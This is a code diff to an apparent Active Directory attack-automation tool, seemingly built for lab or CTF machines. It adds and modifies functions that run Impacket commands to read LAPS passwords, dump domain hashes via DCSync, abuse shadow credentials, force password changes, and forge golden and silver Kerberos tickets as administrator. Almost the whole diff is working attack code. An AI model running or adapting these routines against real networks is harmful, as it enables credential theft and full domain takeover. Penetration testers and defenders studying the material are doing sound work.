@@ -75,7 +75,6 @@ def target_krbroast(box, path):
 def shadow_creds(box, path):
     config.required_creds(box)
     config.required_target(box)
-    # testing
     os.chdir(path.ws_atk)
     print('\033[93m[*]\033[0m Shadow Credentials (time sync)')
     if box.krb:
@@ -87,7 +86,7 @@ def shadow_creds(box, path):
     config.log_cmd(cmd)
     os.system(f'sudo ntpdate {box.fqdn} > /dev/null 2>&1')
     print(f'\033[96m[$]\033[0m {cmd}')
-    os.system(cmd+f' 2>&1 | tee shadow_creds-{box.target}.out')
+    os.system(cmd+f' 2>&1 | tee {box.target}-shadow_creds.out')
     print('\033[92m[+]\033[0m Shadow Credentials\n')
 
 def ReadGMSAPassword(box, path):
@@ -108,7 +107,26 @@ def ReadGMSAPassword(box, path):
         gmsa_name = match.group(1)
         with open(f'{path.ws_atk}/gmsa-{gmsa_name}.out', "w", encoding="utf-8") as f:
             f.write(cmd_out)
-    print('\033[92m[+]\033[0m ReadGMSAPassword\n')
+    print('\033[92m[+]\033[0m Read GMSA password\n')
+
+def ReadLAPSPassword(box, path):
+    config.required_creds(box)
+    os.chdir(path.ws_atk)
+    target = ''
+    opt = ''
+    print('\033[93m[*]\033[0m Read LAPS password')
+    if box.target:
+        opt = f" -computer '{box.target}'"
+        target = box.target+'-'
+    if box.krb:
+        cmd = f"{box.krb} impacket-GetLAPSPassword {box.domain}/{box.username} -k -no-pass"+opt
+    elif box.nt_hash:
+        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:'{box.password}'"+opt
+    else:
+        cmd = f"impacket-GetLAPSPassword {box.domain}/{box.username}:'{box.password}'"+opt
+    print(f'\033[96m[$]\033[0m {cmd}')
+    os.system(cmd+f' 2>&1 | tee {target}laps_password.out')
+    print('\033[92m[+]\033[0m Read LAPS password\n')
 
 def ForceChangePassword(box):
     config.required_creds(box)
@@ -124,10 +142,10 @@ def ForceChangePassword(box):
     config.log_cmd(cmd)
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd)
-    print(f'\033[95m[#]\033[0m Target: {box.target} : {new_password}')
+    print(f"\033[95m[#]\033[0m Target Creds: {box.target} : {new_password}\t-u {box.target} -p '{new_password}'")
     print('\033[92m[+]\033[0m ForceChangePassword\n')
 
-def dcsync(box,path):
+def dcsync(box, path):
     config.required_creds(box)
     opt = ''
     outfile = 'secretsdump.out'
@@ -138,7 +156,7 @@ def dcsync(box,path):
         opt = f' -just-dc-user {box.target}'
         outfile = f'{box.target}-secretsdump.out'
     if box.krb:
-        cmd = f"{box.krb} impacket-secretsdump {box.domain}/{box.username}@{box.fqdn} -k -no-pass -outputfile {outfile}"+opt
+        cmd = f"{box.krb} impacket-secretsdump {box.fqdn} -k -no-pass -outputfile {outfile}"+opt
     elif box.nt_hash:
         cmd = f"impacket-secretsdump {box.domain}/{box.username}@{box.fqdn} -hashes :{box.nt_hash} -outputfile {outfile}"+opt
     else:
@@ -147,3 +165,45 @@ def dcsync(box,path):
     print(f'\033[96m[$]\033[0m {cmd}')
     os.system(cmd)
     print('\033[92m[+]\033[0m DCSync\n')
+
+def golden_ticket(box, path):
+    config.required_creds(box)
+    os.chdir(path.ws_ccache)
+    if not os.path.exists(f'{path.ws_enum}domain-sids.out'):
+        print(f'\033[91m[!]\033[0m Needs the domain SID, run first:\n\t-a, --action sid')
+        exit()
+    else:
+        sid = os.popen(f"""cat {path.ws_enum}domain-sids.out | grep "Domain SID is:" | cut -d':' -f2 | xargs""").read().strip()
+    print('\033[93m[*]\033[0m Golden ticket')
+    if box.nt_hash:
+        if len(box.nt_hash) == 32:
+            cmd = f"impacket-ticketer -nthash {box.nt_hash} -domain-sid {sid} -domain {box.domain} -user-id 500 administrator"
+        else:
+            cmd = f"impacket-ticketer -aesKey {box.nt_hash} -domain-sid {sid} -domain {box.domain} -user-id 500 administrator"
+    else:
+        print(f'\033[91m[!]\033[0m Need NT hash or AES key for golden ticket!')
+        exit()
+    print(f'\033[96m[$]\033[0m {cmd}')
+    os.system(cmd)
+    print('\033[92m[+]\033[0m Golden ticket\n')
+
+def silver_ticket(box, path):
+    config.required_creds(box)
+    os.chdir(path.ws_ccache)
+    if not os.path.exists(f'{path.ws_enum}domain-sids.out'):
+        print(f'\033[91m[!]\033[0m Needs the domain SID, run first:\n\t-a, --action sid')
+        exit()
+    else:
+        sid = os.popen(f"""cat {path.ws_enum}domain-sids.out | grep "Domain SID is:" | cut -d':' -f2 | xargs""").read().strip()
+    print('\033[93m[*]\033[0m Golden ticket')
+    if box.nt_hash:
+        if len(box.nt_hash) == 32:
+            cmd = f"impacket-ticketer -nthash {box.nt_hash} -domain-sid {sid} -domain {box.domain} -dc-ip {box.ip} -spn host/{box.username}.{box.domain} administrator"
+        else:
+            cmd = f"impacket-ticketer -aesKey {box.nt_hash} -domain-sid {sid} -domain {box.domain} -dc-ip {box.ip} -spn host/{box.username}.{box.domain} administrator"
+    else:
+        print(f'\033[91m[!]\033[0m Need NT hash or AES key for silver ticket!')
+        exit()
+    print(f'\033[96m[$]\033[0m {cmd}')
+    os.system(cmd)
+    print('\033[92m[+]\033[0m Silver ticket\n')
